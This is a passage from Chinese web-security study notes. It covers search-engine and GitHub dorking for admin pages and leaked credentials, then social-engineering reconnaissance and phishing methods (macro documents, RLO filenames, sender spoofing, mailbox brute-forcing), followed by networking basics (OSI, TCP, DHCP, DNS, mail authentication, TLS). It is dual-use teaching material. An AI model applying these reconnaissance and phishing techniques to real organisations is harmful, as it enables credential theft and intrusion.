恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu等）可以获取目标站点的较多信息。

### 3.5.1. 搜索引擎处理流程

**数据预处理**

- 长度截断
- 大小写转化
- 去标点符号
- 简繁转换
- 数字归一化，中文数字、阿拉伯数字、罗马字
- 同义词改写
- 拼音改写

**处理**

- 分词
- 关键词抽取
- 非法信息过滤

### 3.5.2. 搜索技巧

- `site:www.hao123.com`
  - 返回此目标站点被搜索引擎抓取收录的所有内容

- `site:www.hao123.com keyword`
  - 返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面
  - 此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等

- `site:www.hao123.com inurl:admin.php`
  - 返回目标站点的地址中包含admin.php的所有页面，可以使用admin.php/manage.php或者其他关键词来寻找关键功能页面

- `link:www.hao123.com`
  - 返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等

- `related:www.hao123.com`
  - 返回所有与目标站点"相似"的页面，可能会包含一些通用程序的信息等

- `intitle:"500 Internal Server Error" "server at"`
  - 搜索出错的页面

- `inurl:"nph-proxy.cgi" "Start browsing"`
  - 查找代理服务器

除了以上的关键字，还有allintile / allinurl / allintext / inanchor / intext / filetype / info / numberange / cache等。

#### 3.5.2.1. 通配符

| 符号 | 含义 |
|------|------|
| `*` | 代表某一个单词 |
| `OR` 或 `\|` | 代表逻辑或 |
| 单词前跟 `+` | 表强制查询 |
| 单词前跟 `-` | 表排除对应关键字 |
| `"` | 强调关键字 |

#### 3.5.2.2. Tips

- 查询不区分大小写
- 括号会被忽略
- 默认用 and 逻辑进行搜索

### 3.5.3. 快照

搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。

另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 Archive.org 等。

### 3.5.4. Github

在Github中，可能会存在源码泄露、AccessKey泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：

- `@example.com password/pass/pwd/secret/credentials/token`
- `@example.com username/user/key/login/ftp/`
- `@example.com config/ftp/smtp/pop`
- `@example.com security_credentials/connetionstring`
- `@example.com JDBC/ssh2_auth_password/send_keys`

## [3.6. 社会工程学](https://websec.readthedocs.io/zh/latest/info/social.html)

### 3.6.1. 企业信息收集

一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。

公司主站中会有业务方向、合作单位等信息。

### 3.6.2. 人员信息收集

针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、开发、运维、财务、人事、业务人员的个人电脑。

人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。

在获取这些信息后，可以在Github/Linkedin等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。

此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。

### 3.6.3. 钓鱼

基于之前收集到的信息，可以使用Office/CHM/RAR/EXE/快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。

其中Office可以使用Office漏洞、宏、OLE对象、PPSX等方式构造利用文件。

Exe可以使用特殊的Unicode控制字符如RLO (Right-to-Left Override) 等来构建容易混淆的文件名。

RAR主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。

如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。

需要注意的是，钓鱼测试也需要注意合规问题，不能冒充监管单位、不能发送违法违规信息。具体可以参考《中华人民共和国电信条例》、《中华人民共和国互联网电子邮件服务管理办法》等法律法规。

### 3.6.4. 其他信息

公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如VPN/堡垒机账号、TeamViewer账号、网络设备默认口令、服务器默认口令等。

## [3.7. 参考链接](https://websec.readthedocs.io/zh/latest/info/ref.html)

* [端口渗透总结](http://www.91ri.org/15441.html)
* [未授权访问总结](https://paper.seebug.org/409)
* [红队测试之邮箱打点](https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw%5FLqsQ)
* [邮件伪造之SPF绕过的5种思路](https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw)

---

# Web安全学习笔记 - 计算机网络与协议

## [网络基础](https://websec.readthedocs.io/zh/latest/network/basic.html)

# 2.1. 网络基础

## 2.1.1. 计算机通信网的组成

计算机网络由**通信子网**和**资源子网**组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。

其中**资源子网**是计算机通信的本地系统环境，包括主机、终端和应用程序等，资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载均衡等。

总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。

---

## 2.1.2. 通信协议

为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。

协议涉及到**三个要素**，分别为：

- **语法**：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义
- **语义**：用于解释比特流的每一部分的意义
- **时序**：事件实现顺序的详细说明

---

## 2.1.3. OSI七层模型

### 2.1.3.1. 简介

OSI（Open System Interconnection）共分为**物理层、数据链路层、网络层、传输层、会话层、表示层、应用层**七层，其具体的功能如下。

### 2.1.3.2. 物理层

- 提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性
- 通过传输介质进行数据流(比特流)的物理传输、故障监测和物理层管理
- 从数据链路层接收帧，将比特流转换成底层物理介质上的信号

### 2.1.3.3. 数据链路层

- 在物理链路的两端之间传输数据
- 在网络层实体间提供数据传输功能和控制
- 提供数据的流量控制
- 检测和纠正物理链路产生的差错
- 格式化的消息称为**帧**

### 2.1.3.4. 网络层

- 负责端到端的数据的路由或交换，为透明地传输数据建立连接
- 寻址并解决与数据在异构网络间传输相关的所有问题
- 使用上面的传输层和下面的数据链路层的功能
- 格式化的消息称为**分组**

### 2.1.3.5. 传输层

- 提供无差错的数据传输
- 接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地
- 在系统之间提供可靠的透明的数据传输,提供端到端的错误恢复和流量控制

### 2.1.3.6. 会话层

- 提供节点之间通信过程的协调
- 负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接
- 使用上面的表示层和下面的传输层的功能

### 2.1.3.7. 表示层

- 提供数据格式、变换和编码转换
- 涉及正在传输数据的语法和语义
- 将消息以合适电子传输的格式编码
- 执行该层的数据压缩和加密
- 从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中

### 2.1.3.8. 应用层

- 包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等

### 2.1.3.9. 总结

| 层次分类 | 组成 | 特点 |
|---------|------|------|
| **低三层**（通信子网） | 物理层、数据链路层、网络层 | 涉及为用户间提供透明连接，操作主要以每条链路（hop-by-hop）为基础，在节点间的各条数据链路上进行通信 |
| **高三层**（资源子网） | 会话层、表示层、应用层 | 主要涉及保证信息以正确可理解形式传送 |
| **传输层** | 传输层 | 高三层和低三层之间的接口，是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求 |

---

## [UDP协议](https://websec.readthedocs.io/zh/latest/network/udp.html)

# 2.2. UDP协议

## 2.2.1. 主要特点

- 协议开销小、效率高。
- UDP是无连接的，即发送数据之前不需要建立连接。
- UDP使用尽最大努力交付，即不保证可靠交付。
- UDP没有拥塞控制。
- UDP支持一对一、一对多、多对一和多对多交互通信。
- UDP的首部开销小，只有8个字节。

---

## [TCP协议](https://websec.readthedocs.io/zh/latest/network/tcp.html)

# 2.3. TCP协议

## 2.3.1. 简介

### 2.3.1.1. 三次握手

TCP (Transmission Control Protocol) 是一种面向连接的、可靠的、基于字节流的传输层通信协议，由RFC 793定义。

**三次握手过程：**

建立TCP连接需要客户端和服务端总共发送**3个报文**来确认连接：

| 步骤 | 方 | 动作 | 状态 |
|------|-------|--------|------|
| 第1次 | 客户端 | 发送 SYN=1, seq=s | → SYN_SENT |
| 第2次 | 服务端 | 发送 SYN=1, ACK=1, ack=s+1, seq=k | → SYN_RCVD |
| 第3次 | 客户端 | 发送 ACK=1, ack=k+1 | → ESTABLISHED |
| 第3次 | 服务端 | 确认 ack=k+1, ACK=1 | → ESTABLISHED |

### 2.3.1.2. 四次挥手

断开TCP连接需要客户端和服务端总共发送**4个报文**来确认断开：

| 步骤 | 方 | 动作 | 状态 |
|------|-------|--------|------|
| 第1次 | 客户端 | 发送 FIN | → FIN_WAIT_1 |
| 第2次 | 服务端 | 发送 ACK (ack+1) | → CLOSE_WAIT |
| 第3次 | 服务端 | 发送 FIN | → LAST_ACK |
| 第4次 | 客户端 | 发送 ACK, 进入 TIME_WAIT | → CLOSED |
| 第4次 | 服务端 | 接收 ACK | → CLOSED |

## 2.3.2. 拥塞控制

**拥塞：** 当网络中的分组数量超过网络的处理能力时，网络性能就会下降。当拥塞严重时，网络甚至无法传递任何分组。

**TCP拥塞控制算法：**
- Tahoe
- Reno
- NewReno
- Vegas
- Hybla
- BIC
- CUBIC
- SACK
- Westwood
- PRR
- BBR

## 2.3.3. 参考链接

- [RFC 793 - TRANSMISSION CONTROL PROTOCOL](https://tools.ietf.org/html/rfc793)
- [RFC 2001 - TCP Slow Start, Congestion Avoidance, Fast Retransmit, and Fast Recovery Algorithms](https://tools.ietf.org/html/rfc2001)
- [RFC 3390 - Increasing TCP's Initial Window](https://tools.ietf.org/html/rfc3390)
- [RFC 5681 - TCP Congestion Control](https://tools.ietf.org/html/rfc5681)
- [TCP congestion control wiki](https://en.wikipedia.org/wiki/TCP_congestion_control)

---

## [DHCP协议](https://websec.readthedocs.io/zh/latest/network/dhcp.html)

# 2.4. DHCP协议

### 2.4.1. 简介

动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。

**关键信息：**
- DHCP服务器端使用 **67/udp**
- 客户端使用 **68/udp**

**DHCP运行四个基本过程：**
1. 请求IP租约
2. 提供IP租约
3. 选择IP租约
4. 确认IP租约

> 客户端在获得了一个IP地址以后，就可以发送一个ARP请求来避免由于DHCP服务器地址池重叠而引发的IP冲突。

### 2.4.2. DHCP 报文格式

```
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |
+---------------+---------------+---------------+---------------+
|                            xid (4)                            |
+-------------------------------+-------------------------------+
|           secs (2)            |           flags (2)           |
+-------------------------------+-------------------------------+
|                          ciaddr  (4)                          |
+---------------------------------------------------------------+
|                          yiaddr  (4)                          |
+---------------------------------------------------------------+
|                          siaddr  (4)                          |
+---------------------------------------------------------------+
|                          giaddr  (4)                          |
+---------------------------------------------------------------+
|                          chaddr  (16)                         |
+---------------------------------------------------------------+
|                          sname   (64)                         |
+---------------------------------------------------------------+
|                          file    (128)                        |
+---------------------------------------------------------------+
|                          options (variable)                  |
+---------------------------------------------------------------+
```

**报文字段说明：**

| 字段 | 长度 | 说明 |
|------|------|------|
| op | 1 | 报文类型：1表示请求，2表示响应 |
| htype | 1 | 硬件地址类型 |
| hlen | 1 | 硬件地址长度 |
| hops | 1 | 跳数 |
| xid | 4 | 事务ID |
| secs | 2 | 已使用时间 |
| flags | 2 | 标志位 |
| ciaddr | 4 | 客户端IP地址 |
| yiaddr | 4 | 你的IP地址 |
| siaddr | 4 | 服务器IP地址 |
| giaddr | 4 | 网关IP地址 |
| chaddr | 16 | 客户端硬件地址 |
| sname | 64 | 服务器名称 |
| file | 128 | 启动文件名 |
| options | 可变 | 可选参数 |

### 2.4.3. 参考链接

- [DHCP Wiki](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)

#### 2.4.3.1. RFC

- [RFC 2131 Dynamic Host Configuration Protocol](https://tools.ietf.org/html/rfc2131)
- [RFC 2132 DHCP Options and BOOTP Vendor Extensions](https://tools.ietf.org/html/rfc2132)
- [RFC 3046 DHCP Relay Agent Information Option](https://tools.ietf.org/html/rfc3046)
- [RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option](https://tools.ietf.org/html/rfc3397)
- [RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4](https://tools.ietf.org/html/rfc3442)
- [RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options](https://tools.ietf.org/html/rfc3942)
- [RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6](https://tools.ietf.org/html/rfc4242)
- [RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four (DHCPv4)](https://tools.ietf.org/html/rfc4361)
- [RFC 4436 Detecting Network Attachment in IPv4 (DNAv4)](https://tools.ietf.org/html/rfc4436)

---

## [路由算法](https://websec.readthedocs.io/zh/latest/network/route.html)

# 2.5. 路由算法

## 2.5.1. 简介

路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。

## 2.5.2. 路由选择算法的功能

源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。

路由选择算法的要求：

* 正确性：确保分组从源节点传送到目的节点
* 简单性：实现方便，软硬件开销小
* 自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化
* 稳定性：能长时间无故障运行
* 公平性：每个节点都有机会传送信息
* 最优性：尽量选取好的路由

## 2.5.3. 自治系统 AS (Autonomous System)

经典定义：

* 由一个组织管理的一整套路由器和网络。
* 使用一种AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。
* 使用一种 AS 之间的路由选择协议用以确定分组在AS之间的路由。

尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。

## 2.5.4. 两大类路由选择协议

因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol)和外部网关协议 EGP (External Gateway Protocol)。

IGP是在一个AS内部使用的路由选择协议，如RIP和OSPF协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的AS中，在数据报到达AS的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如BGP-4，是域间路由选择 (intradomain routing)。

## 2.5.5. RIP

路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。

## 2.5.6. OSPF

开放最短路径优先(Open Shortest Path First，OSPF)，这个算法名为"最短路径优先"是因为使用了 Dijkstra 提出的最短路径算法SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是"最短路径优先"。

---

## [域名系统](https://websec.readthedocs.io/zh/latest/network/domain/index.html)

# 2.6 域名系统 (Domain Name System)

### 内容索引:

* [2.6.1. 简介 (Introduction)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html)
* [2.6.2. 请求响应 (Request & Response)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-2)
   * [2.6.2.1. DNS记录 (DNS Records)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#dns)
   * [2.6.2.2. 响应码 (Response Codes)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-3)
* [2.6.3. 域名系统工作原理 (How DNS Works)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-4)
   * [2.6.3.1. 解析过程 (Resolution Process)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-5)
   * [2.6.3.2. 域传送 (Zone Transfer)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-6)
* [2.6.4. 服务器类型 (Server Types)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-7)
   * [2.6.4.1. 根服务器 (Root Servers)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-8)
   * [2.6.4.2. 权威服务器 (Authoritative Servers)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-9)
   * [2.6.4.3. 递归服务器 (Recursive Servers)](https://websec.readthedocs.io/zh/latest/network/domain/basic.html#section-10)
* [2.6.5. 加密方案 (Encryption Schemes)](https://websec.readthedocs.io/zh/latest/network/domain/sec.html)
   * [2.6.5.1. DoT (DNS-over-TLS)](https://websec.readthedocs.io/zh/latest/network/domain/sec.html#dot)
   * [2.6.5.2. DNS-over-DTLS](https://websec.readthedocs.io/zh/latest/network/domain/sec.html#dns-over-dtls)
   * [2.6.5.3. DoH (DNS-over-HTTPS)](https://websec.readthedocs.io/zh/latest/network/domain/sec.html#doh)
   * [2.6.5.4. DNS-over-QUIC](https://websec.readthedocs.io/zh/latest/network/domain/sec.html#dns-over-quic)
   * [2.6.5.5. DNSCrypt](https://websec.readthedocs.io/zh/latest/network/domain/sec.html#dnscrypt)
* [2.6.6. DNS利用 (DNS Exploitation)](https://websec.readthedocs.io/zh/latest/network/domain/tech.html)
   * [2.6.6.1. DGA (Domain Generation Algorithm)](https://websec.readthedocs.io/zh/latest/network/domain/tech.html#dga)
   * [2.6.6.2. DNS隧道 (DNS Tunneling)](https://websec.readthedocs.io/zh/latest/network/domain/tech.html#dns-1)
* [2.6.7. RDAP](https://websec.readthedocs.io/zh/latest/network/domain/rdap.html)
* [2.6.8. 相关漏洞 (Related Vulnerabilities)](https://websec.readthedocs.io/zh/latest/network/domain/attack.html)
   * [2.6.8.1. DNS劫持 (DNS Hijacking)](https://websec.readthedocs.io/zh/latest/network/domain/attack.html#dns)
   * [2.6.8.2. 拒绝服务 (DoS)](https://websec.readthedocs.io/zh/latest/network/domain/attack.html#section-2)
* [2.6.9. 相关机构 (Related Organizations)](https://websec.readthedocs.io/zh/latest/network/domain/org.html)
   * [2.6.9.1. ICANN](https://websec.readthedocs.io/zh/latest/network/domain/org.html#icann)
   * [2.6.9.2. IANA](https://websec.readthedocs.io/zh/latest/network/domain/org.html#iana)
* [2.6.10. 术语 (Terminology)](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html)
   * [2.6.10.1. mDNS](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#mdns)
   * [2.6.10.2. FQDN (Fully Qualified Domain Name)](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#fqdn)
   * [2.6.10.3. TLD (Top-Level Domain)](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#tld)
   * [2.6.10.4. IDN (Internationalized Domain Name)](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#idn)
   * [2.6.10.5. CNAME](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#cname)
   * [2.6.10.6. TTL (Time To Live)](https://websec.readthedocs.io/zh/latest/network/domain/terminology.html#ttl)
* [2.6.11. 参考链接 (Reference Links)](https://websec.readthedocs.io/zh/latest/network/domain/ref.html)
   * [2.6.11.1. RFC](https://websec.readthedocs.io/zh/latest/network/domain/ref.html#rfc)
   * [2.6.11.2. 相关标准 (Related Standards)](https://websec.readthedocs.io/zh/latest/network/domain/ref.html#section-2)
   * [2.6.11.3. 工具 (Tools)](https://websec.readthedocs.io/zh/latest/network/domain/ref.html#section-3)
   * [2.6.11.4. 研究文章 (Research Articles)](https://websec.readthedocs.io/zh/latest/network/domain/ref.html#section-4)
   * [2.6.11.5. 相关CVE](https://websec.readthedocs.io/zh/latest/network/domain/ref.html#cve)

> **注**：此页面是DNS章节的索引目录页，详细内容位于子页面：basic.html、sec.html、tech.html、rdap.html、attack.html、org.html、terminology.html、ref.html

---

## [HTTP协议簇](https://websec.readthedocs.io/zh/latest/network/http/index.html)

# 2.7. HTTP协议簇

### 内容索引:

* [2.7.1. HTTP标准](https://websec.readthedocs.io/zh/latest/network/http/http.html)
   * [2.7.1.1. 报文格式](https://websec.readthedocs.io/zh/latest/network/http/http.html#section-1)
   * [2.7.1.2. 请求头列表](https://websec.readthedocs.io/zh/latest/network/http/http.html#section-5)
   * [2.7.1.3. 响应头列表](https://websec.readthedocs.io/zh/latest/network/http/http.html#section-6)
   * [2.7.1.4. HTTP状态返回代码 1xx（临时响应）](https://websec.readthedocs.io/zh/latest/network/http/http.html#http-1xx)
   * [2.7.1.5. HTTP状态返回代码 2xx （成功）](https://websec.readthedocs.io/zh/latest/network/http/http.html#http-2xx)
   * [2.7.1.6. HTTP状态返回代码 3xx （重定向）](https://websec.readthedocs.io/zh/latest/network/http/http.html#http-3xx)
   * [2.7.1.7. HTTP状态返回代码 4xx（请求错误）](https://websec.readthedocs.io/zh/latest/network/http/http.html#http-4xx)
   * [2.7.1.8. HTTP状态返回代码 5xx（服务器错误）](https://websec.readthedocs.io/zh/latest/network/http/http.html#http-5xx)
* [2.7.2. HTTP 版本](https://websec.readthedocs.io/zh/latest/network/http/httpver.html)
   * [2.7.2.1. HTTP](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#http-1)
   * [2.7.2.2. HTTP 0.9](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#http-0-9)
   * [2.7.2.3. HTTP 1.0](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#http-1-0)
   * [2.7.2.4. HTTP 1.1](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#http-1-1)
   * [2.7.2.5. SPDY](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#spdy)
   * [2.7.2.6. HTTP/2](https://websec.readthedocs.io/zh/latest/network/http/httpver.html#http-2)
* [2.7.3. HTTPS](https://websec.readthedocs.io/zh/latest/network/http/https.html)
   * [2.7.3.1. 简介](https://websec.readthedocs.io/zh/latest/network/http/https.html#section-1)
   * [2.7.3.2. 交互](https://websec.readthedocs.io/zh/latest/network/http/https.html#section-2)
   * [2.7.3.3. CA](https://websec.readthedocs.io/zh/latest/network/http/https.html#ca)
* [2.7.4. WebSocket](https://websec.readthedocs.io/zh/latest/network/http/websocket.html)
   * [2.7.4.1. 简介](https://websec.readthedocs.io/zh/latest/network/http/websocket.html#section-1)
   * [2.7.4.2. 交互](https://websec.readthedocs.io/zh/latest/network/http/websocket.html#section-2)
* [2.7.5. Cookie](https://websec.readthedocs.io/zh/latest/network/http/cookie.html)
   * [2.7.5.1. 简介](https://websec.readthedocs.io/zh/latest/network/http/cookie.html#section-1)
   * [2.7.5.2. 属性](https://websec.readthedocs.io/zh/latest/network/http/cookie.html#section-2)
* [2.7.6. WebDAV](https://websec.readthedocs.io/zh/latest/network/http/webdav.html)
   * [2.7.6.1. 简介](https://websec.readthedocs.io/zh/latest/network/http/webdav.html#section-1)
   * [2.7.6.2. 相关CVE](https://websec.readthedocs.io/zh/latest/network/http/webdav.html#cve)
* [2.7.7. 参考链接](https://websec.readthedocs.io/zh/latest/network/http/ref.html)
   * [2.7.7.1. RFC](https://websec.readthedocs.io/zh/latest/network/http/ref.html#rfc)
   * [2.7.7.2. Blog](https://websec.readthedocs.io/zh/latest/network/http/ref.html#blog)

---

## [SSH协议](https://websec.readthedocs.io/zh/latest/network/ssh/index.html)

# 2.8. SSH

### 内容索引:

* [2.8.1. 相关 CVE](https://websec.readthedocs.io/zh/latest/network/ssh/cve.html)
   * [2.8.1.1. CVE-2018-15473](https://websec.readthedocs.io/zh/latest/network/ssh/cve.html#cve-2018-15473)
   * [2.8.1.2. CVE-2016-20012](https://websec.readthedocs.io/zh/latest/network/ssh/cve.html#cve-2016-20012)
* [2.8.2. 参考链接](https://websec.readthedocs.io/zh/latest/network/ssh/ref.html)
   * [2.8.2.1. RFC](https://websec.readthedocs.io/zh/latest/network/ssh/ref.html#rfc)
   * [2.8.2.2. Vulnerability Related](https://websec.readthedocs.io/zh/latest/network/ssh/ref.html#vulnerability-related)
   * [2.8.2.3. Papers](https://websec.readthedocs.io/zh/latest/network/ssh/ref.html#papers)

> **注**：此页面是SSH章节的索引目录页，详细内容位于子页面：cve.html、ref.html

---

## [邮件协议族](https://websec.readthedocs.io/zh/latest/network/mail.html)

# 2.9. 邮件协议族

## 2.9.1. 简介

### 2.9.1.1. SMTP

SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。

### 2.9.1.2. POP3

POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。

### 2.9.1.3. IMAP

IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。

---

## 2.9.2. 防护策略

### 2.9.2.1. SPF

发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF允许管理员设定一个DNS TXT记录或SPF记录设定发送邮件服务器的IP范围，如有任何邮件并非从上述指明授权的IP地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。

### 2.9.2.2. DKIM

域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入DKIM-Signature，收件方通过查询DNS记录中的公钥来验证发件人的信息。

### 2.9.2.3. DMARC

基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或/和 DKIM 的身份验证，且需要标头地址中的域名必须与经过身份验证的域名一致。

---

## 2.9.3. 参考链接

### 2.9.3.1. RFC

- RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1
- RFC 6376 DomainKeys Identified Mail (DKIM) Signatures
- RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1
- RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)
- RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)
- RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)
- RFC 8616 Email Authentication for Internationalized Mail
- RFC 8611 Mail

### 2.9.3.2. 相关文档

- Sender Policy Framework wikipedia
- DomainKeys Identified Mail wikipedia
- DMARC wikipedia

### 2.9.3.3. 研究文章

- Composition Kills: A Case Study of Email Sender Authentication (Black Hat USA 2020)

---

## [SSL/TLS协议](https://websec.readthedocs.io/zh/latest/network/ssl.html)

# 2.10. SSL/TLS

## 2.10.1. 简介

### Overview
SSL全称是Secure Sockets Layer，安全套接字层，它是由网景公司(Netscape)在1994年时设计，主要用于Web的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL已经成为互联网保密通信的工业标准。

### Version History
SSL最初的几个版本(SSL 1.0、SSL2.0、SSL 3.0)由网景公司设计和维护，从3.1版本开始，SSL协议由因特网工程任务小组(IETF)正式接管，并更名为TLS(Transport Layer Security)，发展至今已有TLS 1.0、TLS1.1、TLS1.2、TLS1.3这几个版本。

### Important Limitation
如TLS名字所说，SSL/TLS协议仅保障传输层安全。同时，由于协议自身特性(数字证书机制)，SSL/TLS不能被用于保护多跳(multi-hop)端到端通信，而只能保护点到点通信。

### Security Goals
SSL/TLS协议能够提供的安全目标主要包括如下几个：

- **认证性**
  - 借助数字证书认证服务端端和客户端身份，防止身份伪造
- **机密性**
  - 借助加密防止第三方窃听
- **完整性**
  - 借助消息认证码(MAC)保障数据完整性，防止消息篡改
- **重放保护**
  - 通过使用隐式序列号防止重放攻击

### Protocol Phases
为了实现这些安全目标，SSL/TLS协议被设计为一个两阶段协议，分为握手阶段和应用阶段：

**握手阶段**（协商阶段）：
- 客户端和服务端会认证对方身份（依赖于PKI体系，利用数字证书进行身份认证）
- 协商通信中使用的安全参数、密码套件以及MasterSecret
- 后续通信使用的所有密钥都是通过MasterSecret生成

**应用阶段**：
- 在握手阶段完成后进入此阶段
- 通信双方使用握手阶段协商好的密钥进行安全通信

---

## 2.10.2. 协议

TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。

### 2.10.2.1. 记录协议

记录协议(Record Protocol)规定了 TLS 收发数据的基本单位记录(record)。

### 2.10.2.2. 警报协议

警报协议(Alert Protocol)用于提示协议交互过程出现错误。

### 2.10.2.3. 握手协议

握手协议(Handshake Protocol)是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。

### 2.10.2.4. 变更密码规范协议

变更密码规范协议(Change Cipher Spec Protocol)是一个"通知"，告诉对方，后续的数据都将使用加密保护。

---

## 2.10.3. 交互过程

### 2.10.3.1. Client Hello

Client Hello 由客户端发送，内容包括：
- 客户端的一个Unix时间戳(GMT Unix Time)
- 一些随机的字节(Random Bytes)
- 客户端接受的算法类型(Cipher Suites)

### 2.10.3.2. Server Hello

